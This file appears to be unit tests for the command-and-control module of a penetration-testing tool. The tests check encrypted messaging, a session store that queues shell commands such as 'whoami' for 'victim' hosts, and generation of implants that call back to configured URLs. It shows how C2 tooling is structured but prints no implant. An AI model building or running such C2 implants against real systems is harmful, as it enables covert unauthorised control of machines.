"""Unit tests for modules/c2_server.py"""

import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import pytest

from modules.c2_server import C2Store, _GCM, generate_implant


class TestGCMCrypto:

    def _make_key(self, bits: int = 256) -> bytes:
        import secrets
        return secrets.token_bytes(bits // 8)

    def test_gcm_encrypt_decrypt_roundtrip(self):
        gcm = _GCM()
        key = self._make_key()
        plaintext = b'AutoPentestX test payload 1234'
        nonce, ciphertext = gcm.encrypt(key, plaintext)
        recovered = gcm.decrypt(key, nonce, ciphertext)
        assert recovered == plaintext

    def test_gcm_encrypt_decrypt_with_aad(self):
        gcm = _GCM()
        key = self._make_key()
        aad = b'session-id-1234'
        plaintext = b'some task payload'
        nonce, ct = gcm.encrypt(key, plaintext, associated_data=aad)
        recovered = gcm.decrypt(key, nonce, ct, associated_data=aad)
        assert recovered == plaintext

    def test_gcm_wrong_key_raises(self):
        gcm = _GCM()
        key_correct = self._make_key()
        key_wrong   = self._make_key()
        plaintext = b'secret data'
        nonce, ct = gcm.encrypt(key_correct, plaintext)
        with pytest.raises((ValueError, Exception)):
            gcm.decrypt(key_wrong, nonce, ct)

    def test_gcm_tampered_ciphertext_raises(self):
        gcm = _GCM()
        key = self._make_key()
        nonce, ct = gcm.encrypt(key, b'integrity test')
        tampered = bytearray(ct)
        tampered[0] ^= 0xFF
        with pytest.raises((ValueError, Exception)):
            gcm.decrypt(key, nonce, bytes(tampered))

    def test_gcm_different_plaintexts_different_ciphertexts(self):
        gcm = _GCM()
        key = self._make_key()
        n1, c1 = gcm.encrypt(key, b'message one')
        n2, c2 = gcm.encrypt(key, b'message two')
        assert (n1, c1) != (n2, c2)


class TestC2StoreLifecycle:

    def _store(self) -> C2Store:
        tmp = tempfile.mktemp(suffix='.sqlite')
        return C2Store(path=tmp)

    def _sid(self) -> str:
        import uuid
        return str(uuid.uuid4())

    def _key(self) -> bytes:
        import secrets
        return secrets.token_bytes(32)

    def test_store_session_lifecycle(self):
        store = self._store()
        sid = self._sid()
        key = self._key()
        store.register_session(sid, key, {'host': 'victim', 'user': 'root',
                                           'os': 'Linux', 'arch': 'x86_64', 'pid': 1337})
        assert store.get_session_key(sid) == key
        tid = store.enqueue_task(sid, 'shell', 'id')
        assert isinstance(tid, int) and tid > 0
        task = store.next_task(sid)
        assert task is not None
        assert task['kind'] == 'shell'
        assert task['payload'] == 'id'
        assert store.next_task(sid) is None
        store.store_result(sid, tid, 'uid=0(root)')
        removed = store.kill_session(sid)
        assert removed == 1
        assert store.get_session_key(sid) is None

    def test_store_tasks_fifo(self):
        store = self._store()
        sid = self._sid()
        key = self._key()
        store.register_session(sid, key, {})
        payloads = ['whoami', 'hostname', 'ifconfig']
        for p in payloads:
            store.enqueue_task(sid, 'shell', p)
        received = []
        while True:
            t = store.next_task(sid)
            if t is None:
                break
            received.append(t['payload'])
        assert received == payloads

    def test_store_list_sessions(self):
        store = self._store()
        ids = [self._sid() for _ in range(3)]
        for sid in ids:
            store.register_session(sid, self._key(), {'host': sid[:8]})
        rows = store.list_sessions()
        listed_ids = {r['id'] for r in rows}
        for sid in ids:
            assert sid in listed_ids

    def test_store_update_last_seen(self):
        import time
        store = self._store()
        sid = self._sid()
        store.register_session(sid, self._key(), {})
        before = store.list_sessions()[0]['last_seen_at']
        time.sleep(0.01)
        store.update_last_seen(sid)
        after = store.list_sessions()[0]['last_seen_at']
        assert after >= before

    def test_store_set_sleep(self):
        store = self._store()
        sid = self._sid()
        store.register_session(sid, self._key(), {})
        store.set_sleep(sid, 30)
        rows = store.list_sessions()
        assert rows[0]['sleep_seconds'] == 30

    def test_store_kill_nonexistent_returns_zero(self):
        store = self._store()
        assert store.kill_session('no-such-id') == 0


class TestGenerateImplant:

    def test_generate_implant_contains_required_symbols(self):
        code = generate_implant(
            callback_url='https://192.168.1.100:8443',
            psk='supersecretpsk1234',
            out_path='-',
        )
        assert 'CALLBACK' in code
        assert 'PSK'      in code
        assert 'def main' in code

    def test_generate_implant_callback_url_embedded(self):
        url = 'https://10.0.0.1:8443'
        code = generate_implant(url, 'testkey', '-')
        assert url in code

    def test_generate_implant_writes_to_file(self, tmp_path):
        out = str(tmp_path / 'implant.py')
        result = generate_implant('https://c2.local:8443', 'mykey', out)
        assert result == out
        assert os.path.exists(out)
        content = open(out).read()
        assert 'def main' in content

    def test_generate_implant_is_valid_python(self):
        code = generate_implant('https://127.0.0.1:8443', 'psk', '-')
        compile(code, '<implant>', 'exec')
